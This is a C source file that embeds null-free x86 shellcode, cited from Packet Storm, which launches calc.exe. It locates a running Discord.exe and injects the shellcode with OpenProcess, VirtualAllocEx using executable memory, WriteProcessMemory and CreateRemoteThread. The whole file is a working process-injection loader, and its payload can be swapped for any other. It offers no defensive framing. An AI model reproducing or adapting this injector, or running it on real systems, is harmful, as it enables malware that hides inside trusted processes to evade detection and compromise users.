#include <Windows.h>
#include <TlHelp32.h>

// https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
unsigned char payload[] = 
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";

unsigned int payload_len = sizeof(payload);

int main(int argc, char ** argv) {

	HANDLE hProcess;
	HANDLE hRemoteThread;
	LPVOID lpTargetAddress;
	DWORD dwProcessId;

	// Take snapshot of all the processes in the system
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Iterate through all processes until desired process is found
	Process32First(snap, &pe);
	do {
		// If desired process is found, break from loop and save PID
		if (!wcscmp(pe.szExeFile, L"Discord.exe")) {
			dwProcessId = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(snap, &pe));

	// Open the target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	// Allocate as much memory as the payload needs (payload_len) or more
	lpTargetAddress = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// Write the payload to the allocated memory
	WriteProcessMemory(hProcess, lpTargetAddress, payload, payload_len, NULL);

	// Execute the payload code as a new thread from the remote process
	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpTargetAddress, NULL, 0, NULL);
	CloseHandle(hProcess);

	return 0;
}